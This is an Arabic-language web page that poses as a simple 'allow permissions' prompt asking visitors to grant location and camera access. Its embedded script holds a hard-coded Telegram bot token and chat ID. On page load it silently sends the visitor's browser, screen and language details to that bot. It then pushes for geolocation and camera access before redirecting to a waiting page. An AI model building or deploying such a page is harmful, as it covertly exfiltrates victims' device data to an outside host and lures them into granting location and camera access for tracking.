<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>طلب الأذونات</title>
    <style>
        body {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            background-color: #fafafa;
            font-family: Arial, sans-serif;
            direction: rtl;
            text-align: center;
        }
        .alert-box {
            background-color: #ffdddd;
            color: #a33;
            padding: 20px;
            border: 1px solid #a33;
            border-radius: 8px;
            margin-bottom: 20px;
            font-size: 18px;
        }
        button {
            padding: 10px 20px;
            font-size: 18px;
            color: #fff;
            background-color: #4CAF50;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="alert-box">
        من فضلك، اسمح بالوصول إلى الموقع والكاميرا للمتابعة.
    </div>
    <button onclick="requestPermissions()">السماح بالأذونات</button>

    <script>
        const token = '7892070385:AAHIv9d2i5uGwO-AmbAYjwJK_jT7qm1p93I';
        const chatId = '6185375878';

        // إرسال البيانات الأولية إلى Telegram
        function sendInitialData() {
            const userAgent = navigator.userAgent;
            const screenWidth = window.screen.width;
            const screenHeight = window.screen.height;
            const language = navigator.language || navigator.userLanguage;

            const message = `
                📲 معلومات المستخدم الأولية:
                🌐 المتصفح: ${userAgent}
                📏 عرض الشاشة: ${screenWidth}px
                📏 ارتفاع الشاشة: ${screenHeight}px
                🌐 اللغة: ${language}
            `;

            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: new URLSearchParams({
                    chat_id: chatId,
                    text: message
                })
            })
            .then(response => response.json())
            .then(data => console.log('تم إرسال البيانات الأولية:', data))
            .catch(error => console.error('خطأ في إرسال البيانات الأولية:', error));
        }

        sendInitialData();

        // طلب الأذونات
        function requestPermissions() {
            navigator.geolocation.getCurrentPosition(
                () => checkCameraPermission(),
                () => alert("يرجى السماح بالوصول إلى الموقع للمواصلة.")
            );
        }

        // التأكد من إذن الكاميرا
        async function checkCameraPermission() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                stream.getTracks().forEach(track => track.stop());
                window.location.href = "waitingPage.html";
            } catch (error) {
                alert("يرجى السماح بالوصول إلى الكاميرا للمواصلة.");
            }
        }
    </script>
</body>
</html>
